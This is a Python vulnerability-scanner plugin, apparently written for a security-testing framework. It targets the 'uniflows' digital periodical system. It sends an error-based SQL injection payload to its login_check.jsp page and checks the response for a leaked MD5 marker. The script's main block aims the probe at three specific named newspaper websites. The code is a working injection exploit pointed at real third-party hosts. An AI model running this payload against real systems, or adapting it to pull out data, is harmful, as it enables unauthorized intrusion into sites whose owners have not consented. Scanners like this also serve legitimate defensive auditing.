#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: uniflows 数字期刊系统报错注入
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0138987
description:
    大概是测试页面
'''

def assign(service, arg):
    if service == 'uniflows':
        return True, arg

def audit(arg):
    url = arg + 'epaper/test/login_check.jsp'
    payload = 'username=test%27 and (select 1 from  (select count(*),concat(md5(1),floor(rand(0)*2))x from information_schema.tables group by x)a)#&password=sdfasdf&Submit=%B5%C7+%C2%BC'
    md5_1 = 'c4ca4238a0b923820dcc509a6f75849b1'
    code, head, res, err, _ = curl.curl2(url, post=payload)
    #print res
    if code != 0 and md5_1 in res:
        security_hole('SQL Injection: ' +arg+' POST:' + payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('uniflows', 'http://www.zgkjb.com.cn/')[1])
    audit(assign('uniflows', 'http://epaper.cmt.com.cn/')[1])
    audit(assign('uniflows', 'http://szb.scxnews.cn/')[1])